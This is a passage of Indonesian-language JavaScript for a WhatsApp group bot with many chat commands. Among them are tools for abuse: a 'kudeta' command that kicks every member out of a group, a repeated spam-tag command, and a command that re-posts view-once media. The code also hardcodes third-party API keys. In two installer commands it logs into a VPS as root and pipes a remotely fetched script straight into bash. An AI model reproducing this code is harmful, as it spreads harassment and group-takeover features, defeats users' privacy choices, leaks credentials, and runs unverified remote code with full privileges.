return reply("Error! vidio atau lagu tidak ditemukan")
}
}
break

//================================================================================

case "gitclone": {
if (!text) return reply(example("https://github.com/Danny-S8X"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return reply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    client.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await reply(`Error! Repositori Tidak Ditemukan`)
}}
break

//================================================================================


//================================================================================

case "ssweb": {
if (!text) return reply(example("https://example.com"))
if (!isUrl(text)) return reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await client.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: loli})
}
break

//================================================================================



//================================================================================

case "idgc": case "cekidgc": {
if (!m.isGroup) return reply(mess.group)
reply(m.chat)
}
break

//================================================================================

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = `\n *List all group chat*\n`
let a = await client.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return reply(teks)
}
break

//================================================================================

case "shortlink": case "shorturl": {
if (!text) return reply(example("https://example.com"))
if (!isUrl(text)) return reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return reply(link)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shortlink2": {
if (!text) return reply(example("https://example.com"))
if (!isUrl(text)) return reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await client.sendMessage(m.chat, {text: a.url}, {quoted: loli})
}
break

case "cekidch": case "idch": {
if (!text && !m.quoted) return reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await client.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy ID Channel\",\"id\":\"123456789\",\"copy_code\":\"${res.id}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: loli})
await client.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break


//================================================================================

case "pin": case "pinterest": {
if (!text) return reply(example("anime dark"))
await client.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: client.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: loli})
await client.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

//================================================================================

case 'brat1': {
const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
  
  if (!quo) return reply('*masukan teksnya*');
  
async function brat(text) {
  try {
    return await new Promise((resolve, reject) => {
      if(!text) return reject("missing text input");
      axios.get("https://brat.caliphdev.com/api/brat", {
        params: {
          text
        },
        responseType: "arraybuffer"
      }).then(res => {
        const image = Buffer.from(res.data);
        if(image.length <= 10240) return reject("failed generate brat");
        return resolve({
          success: true, 
          image
        })
      })
    })
  } catch (e) {
    return {
      success: false,
      errors: e
    }
  }
}

const buf = await brat(quo);
await client.sendAsSticker(m.chat, buf.image, m, { packname: global.packname, author: global.author })
}
break

case 'furbrat': {
  if(!text) return reply('masukan text nya ler')
  client.sendAsSticker(from, `https://fastrestapis.fasturl.link/tool/furbrat?text=${encodeURIComponent(text)}`, m, { packname: global.packname, author: global.author})
}
break

case "bratvid": case "bratvideo":{
    if (!text) return reply(example('teksnya'))
        client.sendMessage(m.chat, { react: { text: `〽️`, key: m.key }})
    try {
        let brat = `https://fgsi1-brat.hf.space/?text=${encodeURIComponent(text)}&isVideo=true`;
        let response = await axios.get(brat, { responseType: "arraybuffer" });
        let videoBuffer = response.data;
        let stickerBuffer = await client.sendAsSticker(m.chat, videoBuffer, m, {
            packname: global.packname,
            author: global.author,
        });
        console.log("Stiker berhasil dibuat:", stickerBuffer);
    } catch (err) {
        console.error("Error:", err);
        reply("Maaf, terjadi kesalahan saat mencoba membuat stiker video. Silakan coba lagi.");
    }
}
break;

case "emojigif": {
if (!text) return reply(example('😅'))
try {
let brat = `https://restapi-v2.simplebot.my.id/tools/emojitogif?emoji=${encodeURIComponent(text)}`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await client.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
}
}
break

case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) return reply(`Example : ${prefix+command} 😅+🤔`)
		if (!emoji2) return reply(`Example : ${prefix+command} 😅+🤔`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await client.sendAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.namaowner, categories: res.tags })
		    
		}
	    }
	    break

//================================================================================

case "qc": {
if (!text) return reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await client.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./storage/database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return reply("Error")
await client.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

//================================================================================

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return reply("Durasi vidio maksimal 15 detik!")
var image = await client.downloadAndSaveMediaMessage(qmsg)
await client.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//================================================================================

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return reply("Durasi vidio maksimal 15 detik!")
var image = await client.downloadAndSaveMediaMessage(qmsg)
await client.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//================================================================================

case "rvo": case "readviewonce": {
if (!m.quoted) return reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return reply("Pesan itu bukan viewonce!")
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return client.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: loli})
    } else if (/image/.test(type)) {
        return client.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: loli})
    } else if (/audio/.test(type)) {
        return client.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: loli})
    } 
}
break

//================================================================================

case "tourl": {
				if (!/video/.test(mime) && !/image/.test(mime)) return reply(`*Send/reply the Video/Image With Caption* ${prefix + command}`)
				if (!quoted) return reply(`*Send/reply the Video/Image Caption* ${prefix + command}`)
				let q = m.quoted ? m.quoted : m
				client.sendMessage(m.chat, { react: { text: `〽️`, key: m.key }})
				let media = await q.download()
				let uploadImage = require('../storage/uploadImage')
				let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
				let link = await (isTele ? uploadImage : uploadFile)(media)
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								contextInfo: {
									mentionedJid: [m.sender],
									isForwarded: true,
									forwardedNewsletterMessageInfo: {
										newsletterJid: global.idSaluran,
										newsletterName: '𝑫𝒂𝒏𝒏𝒚 3𝒔𝒄𝒂𝒏𝒏𝒐𝒓',
										serverMessageId: -1
									},
									businessMessageForwardInfo: {
										businessOwnerJid: client.decodeJid(client.user.id)
									},
								},
								body: proto.Message.InteractiveMessage.Body.create({
									text: link
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: global.generasi,
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									title: `Hi, @${m.sender.split("@")[0]} Here is Your CatBox Link!\n`,
									subtitle: "𝑺𝒊𝒎𝒑𝒍𝒆 𝑩𝒐𝒕 𝑽𝟏𝟏",
									hasMediaAttachment: true,
									...(await prepareWAMessageMedia({
										image: {
											url: `${link}`
										}
									}, {
										upload: client.waUploadToServer
									}))
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
										"name": "cta_copy",
										"buttonParamsJson": `{\"display_text\":\"Copy Link\",\"id\":\"123456789\",\"copy_code\":\"${link}\"}`
									}, ],
								})
							})
						}
					}
				}, {})

				await client.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				}, {
					quoted: loli
				})

			}
			break
			case "tourlvid": case "tourlvideo": {
				if (!/video/.test(mime) && !/image/.test(mime)) return reply(`*Send/reply the Video/Image With Caption* ${prefix + command}`)
				if (!quoted) return reply(`*Send/reply the Video/Image Caption* ${prefix + command}`)
				let q = m.quoted ? m.quoted : m
				client.sendMessage(m.chat, { react: { text: `〽️`, key: m.key }})
				let media = await q.download()
				let uploadImage = require('../storage/uploadImage')
				let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
				let link = await (isTele ? uploadImage : uploadFile)(media)
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								contextInfo: {
									mentionedJid: [m.sender],
									isForwarded: true,
									forwardedNewsletterMessageInfo: {
										newsletterJid: global.idSaluran,
										newsletterName: '𝑫𝒂𝒏𝒏𝒚 3𝒔𝒄𝒂𝒏𝒏𝒐𝒓',
										serverMessageId: -1
									},
									businessMessageForwardInfo: {
										businessOwnerJid: client.decodeJid(client.user.id)
									},
								},
								body: proto.Message.InteractiveMessage.Body.create({
									text: link
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: global.generasi,
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									title: `Hi, @${m.sender.split("@")[0]} Here Is Your CatBox Link!\n`,
									subtitle: "𝙎𝙞𝙢𝙥𝙡𝙚 𝘽𝙤𝙩 𝙑𝟏𝟏",
									hasMediaAttachment: true,
									...(await prepareWAMessageMedia({
										video: {
											url: `${link}`
										}
									}, {
										upload: client.waUploadToServer
									}))
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
										"name": "cta_copy",
										"buttonParamsJson": `{\"display_text\":\"Copy Link\",\"id\":\"123456789\",\"copy_code\":\"${link}\"}`
									}, ],
								})
							})
						}
					}
				}, {})

				await client.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				}, {
					quoted: loli
				})

			}
			break



case "tourl2": {
if (!/image/.test(mime)) return reply(example("dengan kirim/reply foto"))
let media = await client.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'client.png');

let teks = `
 *Size media :* ${await getSizeMedia(directLink)}
 *Upload service :* pixhost.to
 *Expired link :* Tidak ada expired.`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Url Media\",\"id\":\"123456789\",\"copy_code\":\"${directLink}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: loli})
await client.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await fs.unlinkSync(media)
}
break


//================================================================================

case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return reply(example("id good night"))
if (args.length < 1) return reply(example("id good night"))
if (!m.quoted.text) return reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
reply(result[0])
}
} else {
return reply(example("id good night"))
}}
break

//================================================================================

case 'remini': case 'hd': case 'tohd': {
if (!/image/.test(mime)) return example("dengan kirim/reply foto")
reply(mess.wait)
const FormData = require('form-data');
const { fromBuffer } = require('file-type');
async function getUrls (buffer) {
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");
  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
  });
  let data = await res.text();
  return data;
}
let media = await client.downloadAndSaveMediaMessage(qmsg)
let directLink = await getUrls(fs.readFileSync(media))
try {
const apa = await fetchJson(`https://api.neoxr.eu/api/remini?image=${directLink}&apikey=zakkigans12`)
await client.sendMessage(m.chat, {image: {url: apa.data.url}, caption: mess.done}, {quoted: loli})
} catch (err) {
await reply("Error: " + err)
}
await fs.unlinkSync(media)
}
break 

//================================================================================

case "add": {
if (!m.isGroup) return reply(mess.group)
if (!isCreator && !m.isAdmin) return reply(mess.admin)
if (!m.isBotAdmin) return reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await client.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return reply("Nomor tidak terdaftar di whatsapp")
const res = await client.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return reply(JSON.stringify(res, null, 2))
}} else {
return reply(example("628xx"))
}
}
break

case 'invite': {
	if (!m.isGroup) return reply(mess.group)
if (!isCreator && !m.isAdmin) return reply(mess.admin)
if (!m.isBotAdmin) return reply(mess.botAdmin)
if (!text) return reply(`Silakan Masukkan Nomer yang Ingin Anda Invite\n\nContoh :\n*${prefix+command}* 6285973150738`)
if (text.includes('+')) return reply(`Enter the number together without *+*`)
if (isNaN(text)) return reply(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await client.groupInviteCode(group)
      await client.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        reply(` An invite link is sent to the user`) 
}
break

case "spamtag": case "tag": {
    if (!m.isGroup) return reply(mess.group)
if (!isCreator && !m.isAdmin) return reply(mess.admin)

    if (!text) return reply('*Example : .spamtag tag|jumlah spam*')

    // Split the input to get the tag/user and the number of spams
    const args = text.split("|");
    const tag = args[0]; // @tag or user number
    const spamCount = args[1] ? parseInt(args[1].trim()) : 1; // Default to 1 if no count is given

    if (isNaN(spamCount) || spamCount < 1) {
        return reply("Jumlah spam tidak valid. Harap masukkan angka yang valid.");
    }

    // If the mentioned user is not valid, handle error
    let input = m.mentionedJid[0] ? m.mentionedJid[0] : tag ? tag.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false;

    if (!input) return reply("Tag atau nomor yang valid harus diberikan.");

    let member = m.metadata.participants.map(v => v.id); // List of group members
    
    // Spam tag the user as many times as specified
    for (let i = 0; i < spamCount; i++) {
        await client.sendMessage(m.chat, { text: text, mentions: [input, ...member] }, { quoted: loli });
    }
    
    await reply(`Berhasil spam tag ${spamCount} kali!`);
}
break;

//================================================================================
case "kicktime": case "kiktime": {
    if (!m.isGroup) return reply(mess.group)
if (!isCreator && !m.isAdmin) return reply(mess.admin)
if (!m.isBotAdmin) return reply(mess.botAdmin)

    if (text || m.quoted) {
        const args = text.split("|"); // Splitting input into @tag and time
        const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0] ? args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false;
        const timeString = args[1] ? args[1].trim() : "10"; // Default time 10 seconds if no time is given

        // Check if timeString is a valid number
        let timeInSeconds = parseInt(timeString);
        if (isNaN(timeInSeconds)) return reply("Waktu yang diberikan tidak valid. Harap masukkan waktu dalam detik.");

        var onWa = await client.onWhatsApp(input.split("@")[0]);
        if (onWa.length < 1) return reply("Nomor tidak terdaftar di WhatsApp");

        // Inform the group about the kick time
        await reply(`User ${input.split("@")[0]} akan dikeluarkan dalam ${timeInSeconds} detik...`);

        // Start the countdown
        let countdownMessage = await client.sendMessage(m.chat, { text: `Kicking user in: ${timeInSeconds} detik...` });

        // Countdown loop
        let interval = setInterval(async () => {
            timeInSeconds--;
            if (timeInSeconds <= 0) {
                clearInterval(interval); // Stop the countdown

                // Kick the user out of the group
                const res = await client.groupParticipantsUpdate(m.chat, [input], 'remove');
                await client.sendMessage(m.chat, { text: `Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini` });

                // Delete countdown message
                await client.deleteMessage(m.chat, countdownMessage.key);
            } else {
                // Update countdown message
                await client.sendMessage(m.chat, { text: `Kicking user in: ${timeInSeconds} detik...` }, { quoted: countdownMessage });
            }
        }, 1000); // Every 1 second

    } else {
        return reply(example("@tag|waktu"));
    }
}
break;

case "kick": case "kik": {
if (!m.isGroup) return reply(mess.group)
if (!isCreator && !m.isAdmin) return reply(mess.admin)
if (!m.isBotAdmin) return reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await client.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return reply("Nomor tidak terdaftar di whatsapp")
const res = await client.groupParticipantsUpdate(m.chat, [input], 'remove')
await reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return reply(example("@tag/reply"))
}
}
break

//================================================================================

case "leave": {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
await reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await client.groupLeave(m.chat)
}
break

//================================================================================

case "resetlinkgc": {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!m.isBotAdmin) return reply(mess.botAdmin)
await client.groupRevokeInvite(m.chat)
reply("Berhasil mereset link grup")
}
break

//================================================================================

case "tagall": {
if (!m.isGroup) return reply(mess.group)
if (!isCreator && !m.isAdmin) return reply(mess.admin)
if (!text) return reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await client.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: loli})
}
break

//================================================================================

case "linkgc": {
if (!m.isGroup) return reply(mess.group)
if (!m.isBotAdmin) return reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await client.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await client.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: loli})
}
break

//================================================================================

case "ht": case "hidetag": case "h": {
if (!m.isGroup) return reply(mess.group)
if (!isCreator && !m.isAdmin) return reply(mess.admin)
if (!text) return reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await client.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: loli})
}
break

//================================================================================

case "joingc": case "join": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await client.groupAcceptInvite(result)
reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//================================================================================

case "get": case "g": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("https://example.com"))
let data = await fetchJson(text)
reply(JSON.stringify(data, null, 2))
}
break

//================================================================================

case "joinch": case "joinchannel": {
if (!isCreator) return reply(mess.owner)
if (!text && !m.quoted) return reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await client.newsletterMetadata("invite", result)
await client.newsletterFollow(res.id)
reply(`
*Berhasil join channel whatsapp*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

case "reactch": {
if (!isOwner) return reply(mess.owner)
if (!text) return example("linkpesan 😂")
if (!args[0] || !args[1]) return example("linkpesan 😂")
if (!args[0].includes("https://whatsapp.com/channel/")) return reply("Link tautan tidak valid")
let result = args[0].split('/')[4]
let serverId = args[0].split('/')[5]
let res = await client.newsletterMetadata("invite", result)
await client.newsletterReactMessage(res.id, serverId, args[1])
reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)
}
break

//================================================================================

case "on": case "off": {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
let gc = Object.keys(db.groups[m.chat])
if (!text || isNaN(text)) {
let teks = "\n*List opstion group settings*\n\n"
await gc.forEach((i, e) => {
teks += `* ${e + 1}. ${capital(i)} : ${db.groups[m.chat][i] ? "_aktif_" : "_tidak aktif_"}\n`
})
teks += `\n Contoh penggunaan *.${command}* 1\n`
return reply(teks)
}
const num = Number(text)
let total = gc.length
if (num > total) return
const event = gc[num - 1]
global.db.groups[m.chat][event] = command == "on" ? true : false
return reply(`Berhasil *${command == "on" ? "mengaktifkan" : "mematikan"} ${event}* di grup ini`)
}
break

//================================================================================

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return reply(mess.group)
if (!m.isBotAdmin) return reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await client.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await client.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//================================================================================

case "kudetagc": case "kudeta": {
if (!isCreator) return reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return reply("Grup Ini Sudah Tidak Ada Member!")
await reply("Kudeta Grup By Danny S8X Starting 🔥")
for (let i of memberFilter) {
await client.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//================================================================================

case 'promoteall':
if (!m.isGroup) return reply(mess.group)
if (!isCreator && !m.isAdmin) return reply(mess.admin)
if (!m.isBotAdmin) return reply(mess.botAdmin)
var groupe = await client.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.groupParticipantsUpdate(m.chat, mems, 'promote')
break

case 'demoteall':
if (!m.isGroup) return reply(mess.group)
if (!isCreator && !m.isAdmin) return reply(mess.admin)
if (!m.isBotAdmin) return reply(mess.botAdmin)
var groupe = await client.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.groupParticipantsUpdate(m.chat, mems, 'demote')
break

case "demote":
case "promote": {
if (!m.isGroup) return reply(mess.group)
if (!m.isBotAdmin) return reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await client.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await client.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: loli})
})
} else {
return reply(example("@tag/628xx"))
}
}
break

case "installtemanebula": {
if (!isCreator) return reply(mess.owner)
if (global.installtema == undefined) return reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

ress.on('ready', async () => {
reply("Memproses install *thema Nebula* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await reply("Berhasil install *tema nebula* pterodactyl 🔥")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('2\n');
stream.write('\n');
stream.write('\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installdepend": {
    if (!isCreator) return reply(mess.owner)
if (global.installtema == undefined) return reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}

    const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`;
    const ress = new Client();

    ress.on('ready', async () => {
        reply("Memproses installdepend pterodactyl\nTunggu 1-10 menit hingga proses selesai");
        ress.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', async (code, signal) => {
                await reply("Berhasil install Depend silakan ketik .installtemanebula🔥");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write('11\n');
                stream.write('A\n');
                stream.write('Y\n');
                stream.write('Y\n');
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
